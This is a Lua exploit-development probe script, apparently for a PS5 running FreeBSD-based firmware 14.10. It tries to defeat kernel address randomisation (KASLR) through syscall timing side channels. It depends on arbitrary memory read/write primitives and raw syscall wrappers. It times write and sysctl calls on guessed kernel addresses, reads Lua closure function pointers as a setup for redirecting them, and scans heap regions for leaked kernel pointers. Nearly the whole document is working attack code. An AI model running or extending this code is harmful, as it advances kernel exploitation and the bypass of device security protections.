-- CRASH_CLASS: MODERATE
-- PROBE 56i9: KASLR brute-force via timing side channel
--
-- Context: ALL memory scanning paths are dead. Zero kernel pointers in ANY
-- userland-accessible memory on 14.10. Sony sanitized everything.
--
-- New approach: FreeBSD KASLR on AMD64 typically has 10-14 bits of entropy
-- (1024-16384 possible kernel base addresses). We can use timing differences
-- to detect valid vs invalid kernel addresses:
--
-- Strategy:
--   [B] Calibrate: measure baseline syscall timing (sys 20 getpid)
--   [C] Use sys 202 sysctl with a MIB that reads kernel memory at a guessed addr
--       — if the address is mapped, it takes longer (page table walk succeeds)
--       — if unmapped, it fails fast (page fault, early return)
--   [D] Alternative: use CClosure redirect to call sysarch(165) with GET_GSBASE
--       but with crafted stack that makes the kernel touch a guessed address
--   [E] Simplest: try mincore(78) on kernel VA guesses
--       — mapped = returns 0 with data; unmapped = returns -1
--       — even though mincore returned -1 in 56i probes, the TIMING may differ
--   [F] Try pipe2(542) with kernel VA as buffer — timing of EFAULT varies by mapping

print("=== PROBE 56i9: KASLR BRUTE-FORCE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- sys 624 = VM operation counter (confirmed working, +5 per mmap)
local sc624 = make_syscall(624)

-- ============================================================
-- [B] Timing calibration with sys 624
-- sys 624 returns a counter; measure how long different syscalls take
-- by reading 624 before and after
-- ============================================================
print("")
print("[B] Timing calibration")

-- Warmup
for i = 1, 10 do sc624() end

-- Measure getpid timing (baseline fast syscall)
local sc_getpid2 = make_syscall(20)
local times_getpid = {}
for i = 1, 20 do
    local t1 = to_num(sc624())
    sc_getpid2()
    local t2 = to_num(sc624())
    times_getpid[i] = t2 - t1
end
print("  getpid timing (624 deltas):")
local sum = 0
for _, t in ipairs(times_getpid) do sum = sum + t end
print(string.format("  avg=%.1f samples: %d,%d,%d,%d,%d",
    sum / #times_getpid,
    times_getpid[1], times_getpid[2], times_getpid[3],
    times_getpid[4], times_getpid[5]))

-- ============================================================
-- [C] Timing-based kernel VA probe using writev(121)
-- writev with a kernel VA as the iov buffer pointer:
-- - Valid kernel VA → kernel copies from it → different timing/error
-- - Invalid kernel VA → immediate EFAULT
-- - Unmapped VA → immediate EFAULT but may differ in TLB behavior
-- ============================================================
print("")
print("[C] writev timing probe")

local sc_writev = make_syscall(121)

-- Need a valid fd to write to — use our socket fd or stdout
-- Create a fresh socket pair or use existing fd
-- Actually use write(4) to stdout (fd=1) with kernel VA as buffer
local sc_write = make_syscall(4)

-- Test with known-good userland address first
local test_buf = memory.alloc(64)
safe_wd(test_buf, 0x41414141)

local times_good = {}
for i = 1, 10 do
    local t1 = to_num(sc624())
    pcall(function() sc_write(uint64(1), uint64(test_buf), uint64(1)) end)
    local t2 = to_num(sc624())
    times_good[i] = t2 - t1
end
sum = 0
for _, t in ipairs(times_good) do sum = sum + t end
print(string.format("  write(valid addr) avg=%.1f: %d,%d,%d,%d,%d",
    sum / #times_good,
    times_good[1], times_good[2], times_good[3],
    times_good[4], times_good[5]))

-- Test with completely unmapped address
local times_unmap = {}
for i = 1, 10 do
    local t1 = to_num(sc624())
    pcall(function() sc_write(uint64(1), uint64("0xDEAD00000000"), uint64(1)) end)
    local t2 = to_num(sc624())
    times_unmap[i] = t2 - t1
end
sum = 0
for _, t in ipairs(times_unmap) do sum = sum + t end
print(string.format("  write(unmapped) avg=%.1f: %d,%d,%d,%d,%d",
    sum / #times_unmap,
    times_unmap[1], times_unmap[2], times_unmap[3],
    times_unmap[4], times_unmap[5]))

-- Test with kernel VA range — try a few common FreeBSD kernel bases
-- FreeBSD kernel base is typically 0xFFFFFFFF_80000000 + slide
-- PS5 kernel base might be 0xFFFF8000_00000000 + slide (48-bit VA)
local kernel_bases = {
    "0xFFFFFFFF80000000",  -- classic FreeBSD
    "0xFFFF800000000000",  -- 48-bit canonical low kernel
    "0xFFFF800040000000",  -- +1GB
    "0xFFFF800080000000",  -- +2GB
    "0xFFFF8000C0000000",  -- +3GB
    "0xFFFF800100000000",  -- +4GB
}

print("")
print("  Kernel VA timing probes:")
for _, kbase in ipairs(kernel_bases) do
    local times_k = {}
    for i = 1, 5 do
        local t1 = to_num(sc624())
        pcall(function() sc_write(uint64(1), uint64(kbase), uint64(1)) end)
        local t2 = to_num(sc624())
        times_k[i] = t2 - t1
    end
    sum = 0
    for _, t in ipairs(times_k) do sum = sum + t end
    print(string.format("  %s avg=%.1f: %d,%d,%d,%d,%d",
        kbase, sum / #times_k,
        times_k[1], times_k[2], times_k[3], times_k[4], times_k[5]))
end

-- ============================================================
-- [D] sysctl timing — kern.version reads from a kernel string
-- Compare timing of valid sysctl vs invalid MIB
-- ============================================================
print("")
print("[D] sysctl timing comparison")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(32)
local outbuf = memory.alloc(0x400)
local oldlenp = memory.alloc(8)

-- Valid: kern.version (MIB 1,4)
safe_wd(mib, 1)
safe_wd(mib + 4, 4)

local times_valid_ctl = {}
for i = 1, 10 do
    safe_wd(oldlenp, 0x400)
    local t1 = to_num(sc624())
    pcall(function() sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0)) end)
    local t2 = to_num(sc624())
    times_valid_ctl[i] = t2 - t1
end
sum = 0
for _, t in ipairs(times_valid_ctl) do sum = sum + t end
print(string.format("  kern.version avg=%.1f: %d,%d,%d,%d,%d",
    sum / #times_valid_ctl,
    times_valid_ctl[1], times_valid_ctl[2], times_valid_ctl[3],
    times_valid_ctl[4], times_valid_ctl[5]))

-- Invalid: bogus MIB (99,99)
safe_wd(mib, 99)
safe_wd(mib + 4, 99)

local times_bad_ctl = {}
for i = 1, 10 do
    safe_wd(oldlenp, 0x400)
    local t1 = to_num(sc624())
    pcall(function() sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0)) end)
    local t2 = to_num(sc624())
    times_bad_ctl[i] = t2 - t1
end
sum = 0
for _, t in ipairs(times_bad_ctl) do sum = sum + t end
print(string.format("  bogus MIB avg=%.1f: %d,%d,%d,%d,%d",
    sum / #times_bad_ctl,
    times_bad_ctl[1], times_bad_ctl[2], times_bad_ctl[3],
    times_bad_ctl[4], times_bad_ctl[5]))

-- ============================================================
-- [E] Use CClosure redirect to call sysarch(165) with different
-- addresses — the kernel's copyin/copyout timing may vary
-- ============================================================
print("")
print("[E] CClosure redirect timing test")

-- Get rawequal's CClosure +0x20 pointer
local rawequal_info = tostring(rawequal)
print("  rawequal: " .. rawequal_info:sub(1, 60))

-- Read rawequal's CClosure struct
local re_addr_str = rawequal_info:match("0x[0-9a-fA-F]+")
if re_addr_str then
    local re_addr = uint64(re_addr_str)
    local orig_fn = safe_rq(re_addr + 0x20)
    print("  rawequal +0x20 (original): " .. string.format("0x%08X_%08X",
        get_hi_lo(orig_fn)))

    -- Read type()'s function pointer for comparison
    local type_info = tostring(type)
    local type_addr_str = type_info:match("0x[0-9a-fA-F]+")
    if type_addr_str then
        local type_addr = uint64(type_addr_str)
        local type_fn = safe_rq(type_addr + 0x20)
        print("  type +0x20: " .. string.format("0x%08X_%08X", get_hi_lo(type_fn)))
    end
end

-- ============================================================
-- [F] Final hail mary: scan EVERY readable page for a value
-- matching kernel sysent table signature
-- FreeBSD sysent entries are {int nargs, sy_call_t *callp, ...}
-- The callp would be a kernel function pointer
-- ============================================================
print("")
print("[F] Large RW region remnant scan")

-- Use sys 674 to find large RW regions (heap segments)
local sc674 = make_syscall(674)
local STRIDE = 72
local MAX_RECORDS = 200
local vm_buf = memory.alloc(STRIDE * MAX_RECORDS)
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))

pcall(function()
    sc674(uint64(vm_buf), uint64(STRIDE), uint64(MAX_RECORDS),
          uint64(countp), uint64(0x40000000))
end)
local count = safe_rd(countp) or 0

-- Find large RW regions and scan first page of each
local rw_kptrs = 0
local rw_scanned = 0
for e = 0, math.min(count - 1, MAX_RECORDS - 1) do
    local base = vm_buf + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0

    if prot == 3 then  -- RW
        local sh, sl = get_hi_lo(start_val)
        local eh, el = get_hi_lo(end_val)
        local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))

        -- Scan first 16KB of each RW region
        if size >= 0x4000 then
            rw_scanned = rw_scanned + 1
            for off = 0, 0x3FF8, 8 do
                local a_l = sl + off
                local a_h = sh
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
                local addr = uint64(string.format("0x%X%08X", a_h, a_l))
                local val = safe_rq(addr)
                if val then
                    local vh, vl = get_hi_lo(val)
                    -- True kernel pointer: hi in range AND lo looks like address (>1MB)
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl >= 0x100000 then
                        rw_kptrs = rw_kptrs + 1
                        if rw_kptrs <= 10 then
                            print(string.format("  rgn[%d]+0x%04X: 0x%08X_%08X",
                                e, off, vh, vl))
                        end
                    end
                end
            end
            if rw_scanned >= 30 then break end  -- cap to avoid timeout
        end
    end
end
print(string.format("  RW regions scanned: %d, true kptrs: %d", rw_scanned, rw_kptrs))

collectgarbage("restart")

print("")
print("=== PROBE 56i9 COMPLETE ===")
